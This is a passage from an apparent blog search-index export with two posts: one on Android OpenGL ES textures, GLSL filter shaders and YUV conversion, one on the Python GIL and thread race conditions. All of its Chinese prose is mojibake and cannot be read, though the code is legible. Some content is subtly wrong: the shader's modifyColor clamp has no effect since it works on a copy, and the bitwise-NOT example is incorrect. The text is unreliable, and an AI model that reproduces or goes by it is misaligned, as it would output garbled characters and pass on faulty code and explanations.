é¢œè‰²ã€‚åœ¨çœŸå®ä¸–ç•Œä¸­ï¼Œçº¹ç†è¡¨ç¤ºä¸€ä¸ªå¯¹è±¡çš„é¢œè‰²ã€å›¾æ¡ˆä»¥åŠè§¦è§‰ç‰¹å¾ã€‚çº¹ç†åªè¡¨ç¤ºå¯¹è±¡è¡¨é¢çš„å½©è‰²å›¾æ¡ˆï¼Œå®ƒä¸èƒ½æ”¹å˜å¯¹è±¡çš„å‡ ä½•å½¢å¼ã€‚æ›´è¿›ä¸€æ­¥çš„è¯´ï¼Œå®ƒåªæ˜¯ä¸€ç§é«˜å¼ºåº¦çš„è®¡ç®—è¡Œä¸ºã€‚ æ¯”å¦‚ä¸€å¼ çŸ©å½¢çš„å›¾ç‰‡æ˜¯ç”±ä¸¤ä¸ªä¸‰è§’å½¢æ‹¼èµ·æ¥çš„ï¼Œå·¦ä¸‹ -&gt; å·¦ä¸Š -&gt; å³ä¸‹ -&gt; å³ä¸Š çš„é¡ºåºå°±èƒ½å¾—åˆ°å›¾ç‰‡çš„çº¹ç†ä¸‹é¢è¿™æ®µä»£ç ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œç…§ç€æ³¨é‡Šçœ‹å§ @Override public void onDrawFrame(GL10 gl) { GLES20.glClear(GLES20.GL_COLOR_BUFFER_BIT|GLES20.GL_DEPTH_BUFFER_BIT); GLES20.glUseProgram(mProgram); onDrawSet(); // åœ¨è¿™é‡Œæ·»åŠ æ¨¡ç³Šï¼Œæš–è‰²è°ƒï¼Œå†·è‰²è°ƒç­‰æ»¤é•œæ•ˆæœ GLES20.glUniform1i(hIsHalf,isHalf?1:0); GLES20.glUniform1f(glHUxy,uXY); GLES20.glUniformMatrix4fv(glHMatrix,1,false,mMVPMatrix,0); GLES20.glEnableVertexAttribArray(glHPosition); GLES20.glEnableVertexAttribArray(glHCoordinate); GLES20.glUniform1i(glHTexture, 0); textureId=createTexture(); GLES20.glVertexAttribPointer(glHPosition,2,GLES20.GL_FLOAT,false,0,bPos); GLES20.glVertexAttribPointer(glHCoordinate,2,GLES20.GL_FLOAT,false,0,bCoord); GLES20.glDrawArrays(GLES20.GL_TRIANGLE_STRIP,0,4); } public abstract void onDrawSet(); public abstract void onDrawCreatedSet(int mProgram); private int createTexture(){ int[] texture=new int[1]; if(mBitmap!=null&amp;&amp;!mBitmap.isRecycled()){ //ç”Ÿæˆçº¹ç† GLES20.glGenTextures(1,texture,0); //ç”Ÿæˆçº¹ç† GLES20.glBindTexture(GLES20.GL_TEXTURE_2D,texture[0]); //è®¾ç½®ç¼©å°è¿‡æ»¤ä¸ºä½¿ç”¨çº¹ç†ä¸­åæ ‡æœ€æ¥è¿‘çš„ä¸€ä¸ªåƒç´ çš„é¢œè‰²ä½œä¸ºéœ€è¦ç»˜åˆ¶çš„åƒç´ é¢œè‰² GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MIN_FILTER,GLES20.GL_NEAREST); //è®¾ç½®æ”¾å¤§è¿‡æ»¤ä¸ºä½¿ç”¨çº¹ç†ä¸­åæ ‡æœ€æ¥è¿‘çš„è‹¥å¹²ä¸ªé¢œè‰²ï¼Œé€šè¿‡åŠ æƒå¹³å‡ç®—æ³•å¾—åˆ°éœ€è¦ç»˜åˆ¶çš„åƒç´ é¢œè‰² GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D,GLES20.GL_TEXTURE_MAG_FILTER,GLES20.GL_LINEAR); //è®¾ç½®ç¯ç»•æ–¹å‘Sï¼Œæˆªå–çº¹ç†åæ ‡åˆ°[1/2n,1-1/2n]ã€‚å°†å¯¼è‡´æ°¸è¿œä¸ä¼šä¸borderèåˆ GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_S,GLES20.GL_CLAMP_TO_EDGE); //è®¾ç½®ç¯ç»•æ–¹å‘Tï¼Œæˆªå–çº¹ç†åæ ‡åˆ°[1/2n,1-1/2n]ã€‚å°†å¯¼è‡´æ°¸è¿œä¸ä¼šä¸borderèåˆ GLES20.glTexParameterf(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_T,GLES20.GL_CLAMP_TO_EDGE); //æ ¹æ®ä»¥ä¸ŠæŒ‡å®šçš„å‚æ•°ï¼Œç”Ÿæˆä¸€ä¸ª2Dçº¹ç† GLUtils.texImage2D(GLES20.GL_TEXTURE_2D, 0, mBitmap, 0); return texture[0]; } return 0; } æ˜¾ç¤ºå›¾ç‰‡çš„å…³é”®ä»£ç :GLUtils.texImage2D(GLES20.GL_TEXTURE_2D, 0, mBitmap, 0); æ»¤é•œè¿™äº›ç‰¹æ•ˆæœ¬è´¨ä¸Šæ˜¯åœ¨onDrawFrameé‡Œé¢å»è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•° GLES20.glUniform1i(hChangeType,filter.getType()); GLES20.glUniform3fv(hChangeColor,1,filter.data(),0); æ‰€ä»¥ï¼Œæ»¤é•œ(filter)æ•ˆæœå¯¹åº”çš„ç‰‡å…ƒç€è‰²å™¨å¯ä»¥è¿™æ ·å†™:GLSLè¯­è¨€ precision mediump float; uniform sampler2D vTexture; uniform int vChangeType; uniform vec3 vChangeColor; uniform int vIsHalf; uniform float uXY; //å±å¹•å®½é«˜æ¯” varying vec4 gPosition; varying vec2 aCoordinate; varying vec4 aPos; void modifyColor(vec4 color){ color.r=max(min(color.r,1.0),0.0); color.g=max(min(color.g,1.0),0.0); color.b=max(min(color.b,1.0),0.0); color.a=max(min(color.a,1.0),0.0); } void main(){ vec4 nColor=texture2D(vTexture,aCoordinate); if(aPos.x&gt;0.0||vIsHalf==0){ if(vChangeType==1){ //é»‘ç™½å›¾ç‰‡ float c=nColor.r*vChangeColor.r+nColor.g*vChangeColor.g+nColor.b*vChangeColor.b; gl_FragColor=vec4(c,c,c,nColor.a); }else if(vChangeType==2){ //ç®€å•è‰²å½©å¤„ç†ï¼Œå†·æš–è‰²è°ƒã€å¢åŠ äº®åº¦ã€é™ä½äº®åº¦ç­‰ vec4 deltaColor=nColor+vec4(vChangeColor,0.0); modifyColor(deltaColor); gl_FragColor=deltaColor; }else if(vChangeType==3){ //æ¨¡ç³Šå¤„ç† nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.r,aCoordinate.y-vChangeColor.r)); nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.r,aCoordinate.y+vChangeColor.r)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.r,aCoordinate.y-vChangeColor.r)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.r,aCoordinate.y+vChangeColor.r)); nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.g,aCoordinate.y-vChangeColor.g)); nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.g,aCoordinate.y+vChangeColor.g)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.g,aCoordinate.y-vChangeColor.g)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.g,aCoordinate.y+vChangeColor.g)); nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.b,aCoordinate.y-vChangeColor.b)); nColor+=texture2D(vTexture,vec2(aCoordinate.x-vChangeColor.b,aCoordinate.y+vChangeColor.b)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.b,aCoordinate.y-vChangeColor.b)); nColor+=texture2D(vTexture,vec2(aCoordinate.x+vChangeColor.b,aCoordinate.y+vChangeColor.b)); nColor/=13.0; gl_FragColor=nColor; }else if(vChangeType==4){ //æ”¾å¤§é•œæ•ˆæœ float dis=distance(vec2(gPosition.x,gPosition.y/uXY),vec2(vChangeColor.r,vChangeColor.g)); if(dis&lt;vChangeColor.b){ nColor=texture2D(vTexture,vec2(aCoordinate.x/2.0+0.25,aCoordinate.y/2.0+0.25)); } gl_FragColor=nColor; }else{ gl_FragColor=nColor; } }else{ gl_FragColor=nColor; } ç›¸æœºé¢„è§ˆåˆ©ç”¨OpenGLESæ˜¾ç¤ºå›¾ç‰‡å¤„ç†å›¾ç‰‡ã€‚è§†é¢‘æ¯ä¸€å¸§å…¶å®ä¹Ÿæ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒCameraé¢„è§ˆæ—¶ï¼Œæ¯ä¸€å¸§è‡ªç„¶ä¹Ÿæ˜¯ä¸€å¹…å›¾ç‰‡ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ¯å¼ å›¾ç‰‡æŒ‰ç…§æ—¶é—´é¡ºåºæ˜¾ç¤ºå‡ºæ¥ï¼Œå°±å®Œæˆäº†Cameraé¢„è§ˆçš„å®ç°ã€‚å½“ç„¶ä¸å¯èƒ½æŠŠç›¸æœºæ¯ä¸€å¸§çš„æ•°æ®è½¬æˆä¸€ä¸ªbitmapæ¥æ“ä½œï¼ŒGLES20æä¾›äº†ç»‘å®šçº¹ç†è´´å›¾çš„å‡½æ•°ã€‚GLES20.java // C function void glTexImage2D ( GLenum target, GLint level, GLint internalformat, GLsizei width, GLsizei height, GLint border, GLenum format, GLenum type, const GLvoid *pixels ) public static native void glTexImage2D( int target, int level, int internalformat, int width, int height, int border, int format, int type, java.nio.Buffer pixels ); å®Œå…¨å°±æ˜¯cå‡½æ•°çš„åŒ…è£…è™½ç„¶OpenGLESç»™æˆ‘ä»¬æä¾›çš„å…¥å£æ˜¯ä¼ å…¥Bufferï¼Œç„¶è€Œï¼Œå®ƒå´é™åˆ¶äº†Bufferçš„æ ¼å¼ä¸ºå•ä¸€é€šé“ï¼Œæˆ–è€…æ˜¯RGBAã€RGBç­‰æ ¼å¼ï¼Œè€ŒCameraçš„å¸§æ•°æ®å´åªèƒ½ä¸ºNV21æˆ–è€…YV21çš„Androidçš„CameraåŠCamera2éƒ½å…è®¸ä½¿ç”¨SurfaceTextureä½œä¸ºé¢„è§ˆè½½ä½“ï¼Œä½†æ˜¯å®ƒä»¬æ‰€ä½¿ç”¨çš„SurfaceTextureä¼ å…¥çš„OpenGL texture object nameå¿…é¡»ä¸ºGLES11Ext.GL_TEXTURE_EXTERNAL_OESã€‚è¿™ç§æ–¹å¼ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸¤ä¸ªOpenGL Threadå…±äº«ä¸€ä¸ªTextureï¼Œä¸å†éœ€è¦æ•°æ®å¯¼å…¥å¯¼å‡ºï¼Œä»Cameraé‡‡é›†çš„æ•°æ®ç›´æ¥åœ¨GPUä¸­å®Œæˆè½¬æ¢å’Œæ¸²æŸ“ã€‚å…³é”®å‡½æ•°æ˜¯surfaceTexture.updateTexImage()ï¼Œæ¯å½“æ‘„åƒå¤´æœ‰æ–°çš„æ•°æ®æ¥æ—¶ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡surfaceTexture.updateTexImage()æ›´æ–°é¢„è§ˆä¸Šçš„å›¾åƒã€‚ å›¾ç‰‡å¤„ç†å†·è‰²è°ƒã€æš–è‰²è°ƒã€å¤å¤ã€é»‘ç™½è¿™äº›æ»¤é•œæ•ˆæœå…¶å®å°±æ˜¯æŠŠhex colorçš„ARGB channelè°ƒæ•´ä¸€ä¸‹ã€‚ &lt;color name=&quot;bg_color&quot;&gt;#FF88269F&lt;/color&gt; é»‘ç™½å›¾ç‰‡æ˜¯æ€ä¹ˆæ¥çš„ï¼Ÿé»‘ç™½å›¾ç‰‡ä¸Šï¼Œæ¯ä¸ªåƒç´ ç‚¹çš„RGBä¸‰ä¸ªé€šé“å€¼åº”è¯¥æ˜¯ç›¸ç­‰çš„ã€‚çŸ¥é“äº†è¿™ä¸ªï¼Œå°†å½©è‰²å›¾ç‰‡å¤„ç†æˆé»‘ç™½å›¾ç‰‡å°±éå¸¸ç®€å•äº†ã€‚æˆ‘ä»¬ç›´æ¥è·å–åƒç´ ç‚¹çš„RGBä¸‰ä¸ªé€šé“ï¼Œç›¸åŠ ç„¶åé™¤ä»¥3ä½œä¸ºå¤„ç†åæ¯ä¸ªé€šé“çš„å€¼å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªé»‘ç™½å›¾ç‰‡äº†ã€‚è¿™æ˜¯å‡å€¼çš„æ–¹å¼æ˜¯å¸¸è§é»‘ç™½å›¾ç‰‡å¤„ç†çš„ä¸€ç§æ–¹æ³•ã€‚ç±»ä¼¼çš„è¿˜æœ‰æƒå€¼æ–¹æ³•ï¼ˆç»™äºˆRGBä¸‰ä¸ªé€šé“ä¸åŒçš„æ¯”ä¾‹ï¼‰ã€åªå–ç»¿è‰²é€šé“ç­‰æ–¹å¼ã€‚ä¸ä¹‹ç±»ä¼¼çš„ï¼Œå†·è‰²è°ƒçš„å¤„ç†å°±æ˜¯å•ä¸€å¢åŠ è“è‰²é€šé“çš„å€¼ï¼Œæš–è‰²è°ƒçš„å¤„ç†å¯ä»¥å¢åŠ çº¢ç»¿é€šé“çš„å€¼ã€‚è¿˜æœ‰å…¶ä»–å¤å¤ã€æµ®é›•ç­‰å¤„ç†ä¹Ÿéƒ½å·®ä¸å¤šã€‚ ç±»ä¼¼çš„æ»¤é•œæ•ˆæœè¿˜æœ‰ï¼šèƒ¶ç‰‡æ•ˆæœï¼šå°±æ˜¯æŠŠRGBAçš„A,R,G,Bå…¨éƒ¨ç”¨255å‡æ‰å³ï¼šA = 255 - AR = 255 -RG = 255 - GB = 255 - B ä½†æ˜¯å®é™…ä¸Šç”¨å–åæ“ä½œç¬¦(~)å°±å¯ä»¥äº†å› ä¸ºARGBæ­£å¥½æ˜¯4ä¸ªbyte(1ä¸ªint)æ¯”æ–¹è¯´1111ï¼Œ å–å(ä½é)ä¹‹åå˜æˆ11111110 11111110 11111110 11111110ä¹Ÿå°±æ˜¯255å‡å»çš„æ•ˆæœ è¿™ä¸ªRGBAçš„é¡ºåºä¸èƒ½æé”™In OpenGL and Portable Network Graphics (PNG), the RGBA (byte-order) is used, where the colors are stored in memory such that R is at the lowest address, G after it, B after that, and A last. On a little endian architecture this is equivalent to ABGR (word-order). å°±æ˜¯è¯´ï¼Œopenglå’Œpngæ•°æ®ä¸­,byte arrayçš„é¡ºåºä»å†…å­˜ä½åœ°å€åˆ°é«˜åœ°å€ä¾æ¬¡æ˜¯RGBAï¼Œåœ¨å°ç«¯ä¸Šä¼šæ‰å¤´ Android å…³äºç¾é¢œ/æ»¤é•œ ä»OpenGlå½•åˆ¶è§†é¢‘çš„ä¸€ç§æ–¹æ¡ˆæœ‰è¿™æ ·çš„æ“ä½œbyte[]çš„ä»£ç ï¼Œéœ€è¦æŒ‡å‡ºçš„æ˜¯ã€‚javaå¹³å°ä¸Šï¼Œå› ä¸ºæœ‰jvmçš„å­˜åœ¨ï¼Œæ‰€ä»¥æ˜¯å¤§ç«¯ã€‚æ‰€ä»¥è¿™ä¸‹é¢çš„ä»£ç æ‰æˆç«‹ int[] pixelData = new int[width * height]; int offset = 0; int index = 0; for (int i = 0; i &lt; height; ++i) { for (int j = 0; j &lt; width; ++j) { int pixel = 0; pixel |= (data[offset] &amp; 0xff) &lt;&lt; 16; // R pixel |= (data[offset + 1] &amp; 0xff) &lt;&lt; 8; // G pixel |= (data[offset + 2] &amp; 0xff); // B pixel |= (data[offset + 3] &amp; 0xff) &lt;&lt; 24; // A pixelData[index++] = pixel; offset += pixelStride; } offset += rowPadding; } å›¾ç‰‡æ¨¡ç³Šå›¾ç‰‡æ¨¡ç³Šå¤„ç†ç›¸å¯¹ä¸Šé¢çš„è‰²è°ƒå¤„ç†ç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œé€šå¸¸å›¾ç‰‡æ¨¡ç³Šå¤„ç†æ˜¯é‡‡é›†å‘¨è¾¹å¤šä¸ªç‚¹ï¼Œç„¶ååˆ©ç”¨è¿™äº›ç‚¹çš„è‰²å½©å’Œè¿™ä¸ªç‚¹è‡ªèº«çš„è‰²å½©è¿›è¡Œè®¡ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„è‰²å½©å€¼ä½œä¸ºç›®æ ‡è‰²å½©ã€‚æ¨¡ç³Šå¤„ç†æœ‰å¾ˆå¤šç®—æ³•ï¼Œç±»ä¼¼é«˜æ–¯æ¨¡ç³Šã€å¾„å‘æ¨¡ç³Šç­‰ç­‰ã€‚ YUVæ ¼å¼è§£é‡Š(ç›¸æœºè¿”å›çš„æ˜¯YUVæ ¼å¼çš„å›¾åƒæ•°æ®) RGBå›¾åƒå¤§å®¶éƒ½äº†è§£ï¼ŒRGBå›¾åƒåˆ†ä¸ºäº†ä¸‰ä¸ªé¢œè‰²åˆ†é‡ï¼ŒRçº¢è‰²åˆ†é‡ï¼ŒGç»¿è‰²åˆ†é‡ï¼ŒBè“è‰²åˆ†é‡ã€‚è€ŒYUVå›¾åƒï¼Œä¹Ÿæ˜¯åˆ†ä¸ºäº†ä¸‰ä¸ªåˆ†é‡ï¼ŒYäº®åº¦åˆ†é‡ï¼Œç”¨æ¥è¡¨ç¤ºæ˜äº®åº¦ï¼Œä¹Ÿå«ç°é˜¶å€¼ï¼ŒUåˆ†é‡å’ŒVåˆ†é‡æ˜¯è‰²å€¼åˆ†é‡ï¼Œç”¨æ¥è¡¨ç¤ºå›¾åƒè‰²å½©ä¸é¥±å’Œåº¦ï¼Œå…¶ä¸­Uåˆ†é‡ä¹Ÿå«Cbï¼Œè¡¨ç¤ºçš„å›¾åƒè“è‰²åç§»é‡ï¼ŒVåˆ†é‡ä¹Ÿå«Crï¼Œç”¨æ¥è¡¨ç¤ºå›¾åƒçº¢è‰²éƒ¨åˆ†åç§»é‡ï¼Œæ‰€ä»¥YUVæœ‰æ—¶ä¹Ÿå†™ä½œYCbCrã€‚YUVå›¾åƒæŠŠäº®åº¦å’Œè‰²åº¦åˆ†å¼€äº†ï¼Œé¿å…äº†äº®åº¦å’Œè‰²åº¦çš„ç›¸äº’å¹²æ‰°ï¼Œå¯ä»¥åœ¨é™ä½è‰²åº¦é‡‡æ ·ç‡çš„æƒ…å†µä¸‹ï¼Œä¿æŒå›¾åƒçš„è§†è§‰è´¨é‡ã€‚`RGBè½¬YUV: Y = 0.299 R + 0.587 G + 0.114 B U = - 0.1687 R - 0.3313 G + 0.5 B + 128 V = 0.5 R - 0.4187 G - 0.0813 B + 128 YUVè½¬RGB: R = Y + 1.402 (V - 128) G = Y - 0.34414 (U - 128) - 0.71414 (V - 128) B = Y + 1.772 (U - 128) Cameraå¯ä»¥é€šè¿‡setPreviewFormat()æ–¹æ³•æ¥è®¾ç½®é¢„è§ˆå›¾åƒçš„æ•°æ®æ ¼å¼ï¼Œæ¨èé€‰æ‹©çš„æœ‰ImageFormat.NV21å’ŒImageFormat.YV12ï¼Œé»˜è®¤æ˜¯NV21ã€‚NV21å±äºYUVå›¾åƒ. [Android Camera2 API YUV_420_888 to JPEG](https://stackoverflow.com/questions/40090681/android-camera2-api-yuv-420-888-to-jpeg) [YuvImage.compressToJpeg](https://developer.android.com/reference/android/graphics/YuvImage.html#compressToJpeg(android.graphics.Rect,%20int,%20java.io.OutputStream)) android sdkæä¾›äº†å°†yuvè½¬ä¸ºjpgçš„æ–¹æ³• public boolean compressToJpeg (Rect rectangle, int quality, OutputStream stream)`å°†ä¸€ä¸ªYuvImageå‹ç¼©æˆjpegï¼Œå­˜åˆ°ä¸€ä¸ªoutputStreamä¸­ã€‚è¿™ä¸ªæ–¹æ³•å€ŸåŠ©Androidçš„JNIï¼Œå®ç°äº†éå¸¸é«˜æ•ˆç‡çš„JPEGæ ¼å¼æ–‡ä»¶å†™å…¥ï¼ˆæ¯”Bitmap.compress()æ•ˆç‡éƒ½è¦é«˜ä¸å°‘ï¼‰ å‚è€ƒopengles guide on androidAndroidåˆ©ç”¨ç¡¬è§£ç¡¬ç¼–å’ŒOpenGLESæ¥é«˜æ•ˆçš„å¤„ç†MP4è§†é¢‘ç¬¬ä¸‰æ–¹å®ä¾‹åˆ©ç”¨ FFmpeg åœ¨ Android ä¸Šåšè§†é¢‘ç¼–è¾‘2018å¹´è¿˜åœ¨æ›´æ–°çš„ç¡¬ä»¶è§£ç è§†é¢‘èŒƒä¾‹","tags":[{"name":"opengl","slug":"opengl","permalink":"https://haldir65.github.io/tags/opengl/"}]},{"title":"pythonä¸­å¤šè¿›ç¨‹ã€å¤šçº¿ç¨‹ä»¥åŠGILè®°å½•","date":"2018-11-11T22:21:52.000Z","path":"2018/11/11/2018-11-11-python-gil-and-what-you-can-do-about-it/","text":"If your code has a lot of I/O or Network usage:Multithreading is your best bet because of its low overhead If you have a GUIMultithreading so your UI thread doesnâ€™t get locked up If your code is CPU bound:You should use multiprocessing (if your machine has multiple cores) Python Global Interpreter Lock(GIL)å¯¹äºCPythonï¼Œæ‰€æœ‰çš„python bytecodeåœ¨æ‰§è¡Œå‰éƒ½éœ€è¦è·å¾—interpreterçš„lock,one vm thread at a timeã€‚(javaå®ç°çš„pythonä¼¼ä¹æ²¡æœ‰è¿™ä¸ªçƒ¦æ¼)GILçš„å‡ºç°ä¼¼ä¹æ˜¯å†å²åŸå› ï¼ˆä¸ºäº†æ–¹ä¾¿çš„ç›´æ¥ä½¿ç”¨å½“æ—¶ç°æœ‰çš„c extensionï¼‰ã€‚è€Œæ²¡æœ‰åœ¨python3ä¸­è¢«ç§»é™¤çš„åŸå› æ˜¯å› ä¸ºè¿™ä¼šé€ æˆå•çº¿ç¨‹çš„ç¨‹åºåœ¨python3ä¸­è·‘çš„åè€Œæ¯”python2ä¸­æ…¢ã€‚ å› ä¸ºGILçš„å­˜åœ¨ï¼Œpythonä¸­çš„çº¿ç¨‹å¹¶ä¸èƒ½å®ç°cpuçš„å¹¶å‘è¿è¡Œ(åŒæ—¶åªèƒ½æœ‰ä¸€æ¡çº¿ç¨‹åœ¨è¿è¡Œ)ã€‚ä½†å¯¹äºI/O intensiveçš„ä»»åŠ¡æ¥è¯´ï¼Œcpuéƒ½åœ¨ç­‰å¾…I/Oæ“ä½œå®Œæˆï¼Œæ‰€ä»¥çˆ¬è™«è¿™ç±»æ“ä½œä½¿ç”¨å¤šçº¿ç¨‹æ˜¯åˆé€‚çš„ã€‚æ ¹æ®A Jesse Jiryu Davisåœ¨pycon2017ä¸Šçš„æ¼”è®²ï¼Œåœ¨å¤šçº¿ç¨‹pythonç¨‹åºä¸­ï¼Œå¦‚æœæŸæ¡çº¿ç¨‹å¼€å§‹è¿›è¡ŒI/Oæ“ä½œï¼Œå°±ä¼šä¸»åŠ¨æ”¾å¼ƒGIL(è¿™æ˜¯åœ¨socket moduleçš„æºç ä¸­)ï¼Œæˆ–è€…åœ¨cpu-intensiveç¨‹åºä¸­ï¼Œä¸€æ¡çº¿ç¨‹è¿ç»­æ‰§è¡Œ1000æ¬¡(python2ä¸­æ˜¯ä¸€ä¸ªå¸¸æ•°)åå°±ä¼šè¢«å¤ºèµ°gilã€‚socketé‡Œé¢æ‰¾å…³é”®å­—Py_BEGIN_ALLOW_THREADSå’ŒPy_END_ALLOW_THREADS è¿™æ˜¯ä¸¤ä¸ªmacroï¼Œè‡ªå·±å†™python c entensionçš„æ—¶å€™å¯èƒ½ä¼šç”¨å¾—ä¸Š å¤šçº¿ç¨‹ä»¥åŠä¸€äº›åŒæ­¥çš„é—®é¢˜å•çº¿ç¨‹çš„ç‰ˆæœ¬ # single_threaded.py import time from threading import Thread COUNT = 50000000 def countdown(n): while n&gt;0: n -= 1 start = time.time() countdown(COUNT) end = time.time() print(&#39;Time taken in seconds -&#39;, end - start) å¤šçº¿ç¨‹çš„ç‰ˆæœ¬å¤šçº¿ç¨‹ä¸‹æ€»ä¼šå¯¹å…¬å…±èµ„æºçš„æ“ä½œæ˜¯éœ€è¦è€ƒè™‘race conditionçš„ï¼Œå¹¶ä¸”è¿™ç§é—®é¢˜å¾ˆéš¾é€šè¿‡æµ‹è¯•æµ‹å‡ºæ¥ã€‚ # multi_threaded.py import time from threading import Thread COUNT = 50000000 def countdown(n): while n&gt;0: n -= 1 t1 = Thread(target=countdown, args=(COUNT//2,)) t2 = Thread(target=countdown, args=(COUNT//2,)) start = time.time() t1.start() t2.start() t1.join() t2.join() end = time.time() print(&#39;Time taken in seconds -&#39;, end - start) å¤šçº¿ç¨‹è™½ç„¶åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€æ¡çº¿ç¨‹è¿è¡Œï¼Œä½†ç‰µæ¶‰åˆ°æ•°æ®å…±äº«çš„æ—¶å€™è¿˜æ˜¯è¦åŠ é” æ¯”å¦‚è¿™ä¸ªä¾‹å­ï¼Œç…§è¯´æ‰“å°å‡ºæ¥çš„åº”è¯¥æ˜¯0ï¼Œä½†å®é™…æ“ä½œä¸­å¯èƒ½æ‰“å‡ºæ¥æ­£æ•° import time, threading # å‡å®šè¿™æ˜¯ä½ çš„é“¶è¡Œå­˜æ¬¾: balance = 0 def change_it(n): # å…ˆå­˜åå–ï¼Œç»“æœåº”è¯¥ä¸º0: global balance balance = balance + n balance = balance - n def run_thread(n): for i in range(1000000): change_it(n) t1 = threading.Thread(target=run_thread, args=(5,)) t2 = threading.Thread(target=run_thread, args=(8,)) t1.start() t2.start() t1.join() t2.join() print(balance) ä¸Šè¿°è¿‡ç¨‹çš„åŸå› åœ¨äºbalance = balance + nè¿™ä¸€æ­¥å…¶å®éœ€è¦è‡³å°‘ä¸¤æ¡cpuè¯­å¥ï¼šx = balance +nbalance = x æ­£å¸¸é¡ºåºæ˜¯t1 (+5,-5) t2 (+8, -8) è¿™æ ·çš„é¡ºåºä¸æ­£å¸¸çš„é¡ºåº åˆå§‹å€¼ balance = 0 t1: x1 = balance + 5 # x1 = 0 + 5 = 5 t2: x2 = balance + 8 # x2 = 0 + 8 = 8 t2: balance = x2 # balance = 8 t1: balance = x1 # balance = 5 t1: x1 = balance - 5 # x1 = 5 - 5 = 0 t1: balance = x1 # balance = 0 t2: x2 = balance -8 # x2 =-8 t2: balance = x2 # balance = -8 ç»“æœ balance = -8 æ‰€ä»¥æ˜¯æœ‰å¯èƒ½æ‰“å°å‡º-8è¿™æ ·çš„é”™è¯¯çš„ç»“æœçš„ è¿™ç§æƒ…å†µä¸‹åªè¦åŠ é”å°±å¯ä»¥äº† import time, threading balance = 0 lock = threading.Lock() def change_it(n): global balance balance = balance + n balance = balance - n def run_thread(n): for i in range(1000000): lock.acquire() try: change_it(n) finally: lock.release() t1 = threading.Thread(target=run_thread, args=(5,)) t2 = threading.Thread(target=run_thread, args=(8,)) t1.start() t2.start() t1.join() t2.join() print(balance) æ”¹æˆæ¯ä¸€æ¬¡å¯¹å…±äº«å˜é‡è¿›è¡Œæ“ä½œéƒ½éœ€è¦åŠ é”ä¹‹åï¼Œæ‰“å°ç»“æœå°±æ­£å¸¸äº†å¤šè¿›ç¨‹ä¹‹é—´çš„åŒæ­¥æ–¹å¼åŒ…æ‹¬queue,Event,Semaphoresï¼ŒConditionsç­‰ ä»bytecodeæ¥çœ‹ï¼Œincrementè¿™ä¸€æ“ä½œå¹¶ä¸æ˜¯atomicçš„pythoné‡Œé¢å¾ˆæ–¹ä¾¿increment-is-not-atomic.py def foo(): global n n += 1 import dis dis.dis(foo) python incrememt-is-not-atomic.py 3 0 LOAD_GLOBAL 0 (n) 2 LOAD_CONST 1 (1) 4 INPLACE_ADD 6 STORE_GLOBAL 0 (n) 8 LOAD_CONST 0 (None) 10 RETURN_VALUE å¤šçº¿ç¨‹ç¯å¢ƒä¸‹å¯¹èµ„æºçš„æ“ä½œéœ€è¦è€ƒè™‘çº¿ç¨‹å®‰å…¨é—®é¢˜æœ‰äº›æ“ä½œä¸æ˜¯åŸå­æ€§çš„Thinking about Concurrency, Raymond Hettinger, Python core developerjavaä¸­æœ€åˆçš„è®¾è®¡æ˜¯æœ‰kill threadçš„methodçš„ï¼Œä½†æ˜¯åæ¥è¢«deprecatedäº†ï¼ˆå‡è®¾ä½ killäº†ä¸€ä¸ªè·å–äº†é”çš„çº¿ç¨‹ï¼Œç¨‹åºå°†è¿›å…¥æ­»é”çŠ¶æ€ï¼‰ã€‚ pythonä¸­ç†è®ºä¸Šæ˜¯å¯ä»¥killä¸€ä¸ªçº¿ç¨‹çš„ï¼Œä½†æ˜¯killä¸€ä¸ªçº¿ç¨‹è¿™ä»¶äº‹æœ¬èº«å°±æ˜¯ä¸åº”è¯¥çš„ã€‚ ä¸€ä¸ªæœ€ç®€å•çš„å¤šçº¿ç¨‹èµ„æºç«äº‰çš„ä¾‹å­ import threading counter = 0 def worker(): global counter counter += 1 print(&#39;The count is %d&#39; % counter) print(&#39;------------&#39;) print(&#39;Starting up --------&#39;) for i in range(10): threading.Thread(target=worker).start() print(&#39;Finishing up&#39;) è¾“å‡º Starting up -------- The count is 1 ------------ The count is 2 ------------ The count is 3 ------------ The count is 4 ------------ The count is 5 ------------ The count is 6 ------------ The count is 7 ------------ The count is 8 ------------ The count is 9 ------------ The count is 10 ------------ Finishing up æ•°æ®é‡æ¯”è¾ƒå°çš„æ—¶å€™ä¸å®¹æ˜“å‘ç°è¿™é‡Œå­˜åœ¨çš„race conditionã€‚å¦‚æœåœ¨æ¯ä¸€æ¬¡å¯¹èµ„æºè¿›è¡Œæ“ä½œä¹‹é—´éƒ½æ’å…¥ä¸€æ®µthread.sleepï¼Œé—®é¢˜å°±å‡ºæ¥äº† import threading,time, random FUZZ = True def fuzz(): if FUZZ: time.sleep(random.random()) counter = 0 def worker(): global counter fuzz() oldcnt = counter fuzz() counter = oldcnt +1 fuzz() print(&#39;The count is %d&#39; % counter) fuzz() print(&#39;------------&#39;) fuzz() print(&#39;Starting up --------\\n&#39;) fuzz() for i in range(10): t = threading.Thread(target=worker) t.start() fuzz() print(&#39;Finishing up&#39;) fuzz() 